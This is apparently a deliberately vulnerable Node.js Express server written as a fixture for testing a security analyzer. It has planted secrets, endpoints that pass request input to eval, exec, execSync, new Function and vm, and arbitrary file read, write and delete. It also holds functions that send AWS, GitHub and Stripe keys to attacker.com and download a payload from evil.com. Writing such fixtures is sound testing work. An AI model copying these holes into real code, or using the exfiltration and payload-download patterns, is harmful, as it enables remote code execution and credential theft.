/**
 * INTENTIONALLY VULNERABLE CODE - FOR TESTING SECURITY ANALYZER
 * DO NOT USE IN PRODUCTION
 */

const express = require('express');
const { exec, execSync, spawn } = require('child_process');
const fs = require('fs');
const app = express();

// HARDCODED SECRETS (Should be detected)
const AWS_SECRET = "AKIAIOSFODNN7EXAMPLE5678";
const GITHUB_PAT = "ghp_abcdefghijklmnopqrstuvwxyz1234567890";
const STRIPE_KEY = "sk_live_abcdefghijklmnopqrstuvwxyz";
const JWT_SECRET = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.secret";
const API_TOKEN = "xoxp-123456789012-123456789012-abcdefghijklmnopqrstuvwxyz";

// High entropy string
const ENCRYPTION_KEY = "9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d3e2f1a0b9c8d7e6f5a4b3c2d1e0f";

// CRITICAL: Code Execution Vulnerability
app.get('/eval', (req, res) => {
    // User input directly to eval
    const code = req.query.code; // Taint source
    const result = eval(code);    // DANGEROUS SINK
    res.send(result);
});

// CRITICAL: Command Injection
app.get('/exec', (req, res) => {
    const filename = req.query.file; // Taint source
    exec(`cat ${filename}`, (error, stdout) => { // DANGEROUS
        res.send(stdout);
    });
});

// CRITICAL: Shell Command with User Input
app.get('/command', (req, res) => {
    const cmd = req.query.cmd; // Taint source
    execSync(cmd); // DANGEROUS SINK
    res.send('Executed');
});

// HIGH: Dynamic Function Creation
app.get('/function', (req, res) => {
    const code = req.query.code; // Taint source
    const dynamicFunc = new Function(code); // DANGEROUS
    dynamicFunc();
    res.send('Done');
});

// HIGH: setTimeout with String
app.get('/timeout', (req, res) => {
    const code = req.query.code; // Taint source
    setTimeout(code, 1000); // DANGEROUS
    res.send('Scheduled');
});

// MEDIUM: Arbitrary File Write
app.post('/write', (req, res) => {
    const path = req.body.path;    // Taint source
    const content = req.body.data; // Taint source
    fs.writeFileSync(path, content); // DANGEROUS
    res.send('Written');
});

// MEDIUM: File Delete
app.delete('/file', (req, res) => {
    const path = req.query.path; // Taint source
    fs.unlinkSync(path); // DANGEROUS
    res.send('Deleted');
});

// Dangerous VM usage
const vm = require('vm');
app.get('/vm', (req, res) => {
    const code = req.query.code; // Taint source
    vm.runInThisContext(code); // DANGEROUS
    res.send('Executed in VM');
});

// Network operations
const https = require('https');
const axios = require('axios');

function exfiltrateData() {
    // Sending sensitive data externally
    axios.post('http://attacker.com/collect', {
        aws: AWS_SECRET,
        github: GITHUB_PAT,
        stripe: STRIPE_KEY
    });
}

function downloadPayload() {
    // Downloading external file
    const file = fs.createWriteStream('/tmp/malware.js');
    https.get('https://evil.com/payload.js', (response) => {
        response.pipe(file);
    });
}

// Taint flow example
function taintFlowDemo() {
    // Source: Process arguments
    const userInput = process.argv[2]; // Taint source
    
    // Some processing
    const processed = userInput.toUpperCase();
    
    // Sink: Dangerous function
    eval(processed); // CRITICAL TAINT FLOW
}

// Using environment variables unsafely
const DB_PASSWORD = process.env.DB_PASS || "default_password_123";
const SECRET_KEY = process.env.SECRET || "hardcoded_secret_key";

// Weak crypto
const crypto = require('crypto');
function weakHash(data) {
    return crypto.createHash('md5').update(data).digest('hex'); // WEAK
}

// Child process spawn with shell
function unsafeSpawn(cmd) {
    spawn(cmd, { shell: true }); // DANGEROUS
}

// JSON.parse without validation
app.post('/parse', (req, res) => {
    const data = req.body.json; // Taint source
    const parsed = JSON.parse(data); // Could be exploited
    res.json(parsed);
});

// File read with user-controlled path
app.get('/read', (req, res) => {
    const filepath = req.query.file; // Taint source
    const content = fs.readFileSync(filepath, 'utf8'); // DANGEROUS - Path traversal
    res.send(content);
});

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on port ${PORT}`);
    console.log(`AWS Key: ${AWS_SECRET}`); // Logging secrets
});

module.exports = app;


